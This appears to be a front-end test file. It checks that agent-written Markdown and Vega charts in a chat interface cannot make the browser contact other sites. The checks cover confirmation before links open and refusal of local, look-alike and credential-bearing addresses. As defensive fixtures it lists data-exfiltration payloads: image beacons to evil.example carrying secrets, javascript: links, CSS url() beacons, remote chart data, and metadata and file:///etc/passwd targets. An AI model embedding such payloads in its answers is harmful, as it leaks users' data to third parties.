import { act, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, expect, it, vi } from "vitest";

import VegaChart from "./VegaChart";
import { describeLink } from "./ExternalLink";
import { Markdown } from "./Markdown";

// Nothing the agent writes may make the browser contact another site by
// itself. These tests watch every way a page can send a request.
let requests: string[];

beforeEach(() => {
  requests = [];
  vi.stubGlobal(
    "fetch",
    vi.fn((input: unknown) => {
      requests.push(String(input));
      return Promise.reject(new Error("no network in tests"));
    }),
  );
  vi.spyOn(XMLHttpRequest.prototype, "open").mockImplementation(function (_method: string, url: string | URL) {
    requests.push(String(url));
  });
  vi.stubGlobal("matchMedia", () => ({ matches: false, addEventListener() {}, removeEventListener() {} }));
  // jsdom has no sendBeacon; a page could still try it.
  Object.defineProperty(navigator, "sendBeacon", {
    configurable: true,
    value: (url: string | URL) => {
      requests.push(String(url));
      return false;
    },
  });
  vi.spyOn(window, "open").mockImplementation((url?: string | URL) => {
    requests.push(`open:${String(url)}`);
    return null;
  });
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

/** Every address an element of the page could load or navigate to. */
function addresses(root: HTMLElement): string[] {
  const found: string[] = [];
  for (const element of root.querySelectorAll("*")) {
    for (const attribute of ["src", "href", "srcset", "action", "formaction", "poster", "data", "background", "ping"]) {
      const value = element.getAttribute(attribute);
      if (value && !value.startsWith("data:image/") && !value.startsWith("#")) found.push(`${attribute}=${value}`);
    }
    const style = element.getAttribute("style") ?? "";
    if (/url\(/i.test(style)) found.push(`style=${style}`);
  }
  return found;
}

const HOSTILE = [
  "![pixel](https://evil.example/p.gif?data=secret)",
  "![svg](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)",
  '<img src="https://evil.example/raw.gif">',
  '<iframe src="https://evil.example/"></iframe>',
  '<link rel="prefetch" href="https://evil.example/">',
  '<a href="https://evil.example/" ping="https://evil.example/ping">raw</a>',
  "[text](https://evil.example/?participant=123)",
  "<https://evil.example/autolink?x=1>",
  "https://evil.example/bare?x=1",
  "[js](javascript:fetch('https://evil.example'))",
  "[ref][r]\n\n[r]: https://evil.example/ref",
  '<video poster="https://evil.example/poster.png"></video>',
  '<div style="background:url(https://evil.example/bg.png)">styled</div>',
].join("\n\n");

it("renders hostile Markdown without any address that loads or navigates", () => {
  const { container } = render(<Markdown text={HOSTILE} />);
  // Raw HTML stays text, images from links aren't drawn, and links are buttons.
  expect(addresses(container)).toEqual([]);
  expect(container.querySelector("img")).toBeNull();
  expect(container.querySelector("a, iframe, link, video")).toBeNull();
  expect(requests).toEqual([]);
});

it("opens a link only after showing its full address and a confirmation", () => {
  render(<Markdown text="[the docs](https://evil.example/?participant=123)" />);
  fireEvent.click(screen.getByRole("button", { name: "the docs" }));
  expect(requests).toEqual([]);
  expect(screen.getByTestId("link-address")).toHaveTextContent("https://evil.example/?participant=123");
  fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
  expect(requests).toEqual([]);
  fireEvent.click(screen.getByRole("button", { name: "the docs" }));
  fireEvent.click(screen.getByRole("button", { name: "Open evil.example" }));
  expect(requests).toEqual(["open:https://evil.example/?participant=123"]);
});

it("shows look-alike hosts as the browser sees them, and refuses other schemes", () => {
  expect(describeLink("https://exаmple.com/")?.host).toBe("xn--exmple-4nf.com");
  expect(describeLink("javascript:alert(1)")).toBeNull();
  expect(describeLink("file:///etc/passwd")).toBeNull();
  expect(describeLink("not a url")).toBeNull();
  expect(describeLink("//evil.example/x")).toBeNull();
  expect(describeLink("HTTPS://Evil.Example/X")?.host).toBe("evil.example");
});

it("never opens links to this computer, the local network, or with credentials", () => {
  for (const href of [
    "http://127.0.0.1:8766/api/conversations",
    "http://2130706433/",
    "http://localhost/",
    "http://printer.local/",
    "http://192.168.1.1/",
    "http://10.0.0.8/",
    "http://172.20.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "https://SECRET@evil.example/",
    "http://localhost./",
    "http://printer.local./",
    "http://100.64.1.1/",
    "http://db.internal/",
    "http://nas.home.arpa/",
  ]) {
    expect(describeLink(href), href).toBeNull();
  }
});

it("keeps footnote links within the answer", () => {
  const { container } = render(<Markdown text={"A claim.[^1]\n\n[^1]: The source."} />);
  const links = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href") ?? "");
  expect(links.length).toBeGreaterThan(0);
  expect(links.every((href) => href.startsWith("#"))).toBe(true);
});

const CHARTS = {
  dataUrl: { data: { url: "https://evil.example/data.csv" }, mark: "bar" },
  image: {
    data: { values: [{ u: "https://evil.example/i.png" }] },
    mark: "image",
    encoding: { url: { field: "u", type: "nominal" } },
  },
  href: {
    data: { values: [{ a: 1, h: "https://evil.example/click" }] },
    mark: "point",
    encoding: { x: { field: "a", type: "quantitative" }, href: { field: "h", type: "nominal" } },
  },
  lookup: {
    data: { values: [{ a: 1 }] },
    transform: [{ lookup: "a", from: { data: { url: "https://evil.example/l.json" }, key: "a", fields: ["b"] } }],
    mark: "point",
  },
};

it.each(Object.entries(CHARTS))("a chart can't reach another site (%s)", async (_name, spec) => {
  const { container } = render(<VegaChart spec={JSON.stringify(spec)} />);
  await act(() => new Promise((resolve) => setTimeout(resolve, 200)));
  await waitFor(() => expect(requests).toEqual([]));
  expect(addresses(container).filter((a) => a.includes("evil.example"))).toEqual([]);
  // A link a person could click in the chart.
  const mark = container.querySelector(".mark-symbol path, .mark-image image");
  if (mark) fireEvent.click(mark);
  // Refused by DataLab's loader, not just unreachable.
  await waitFor(() => expect(container).toHaveTextContent("Charts can't load data from links."));
  expect(requests).toEqual([]);
});
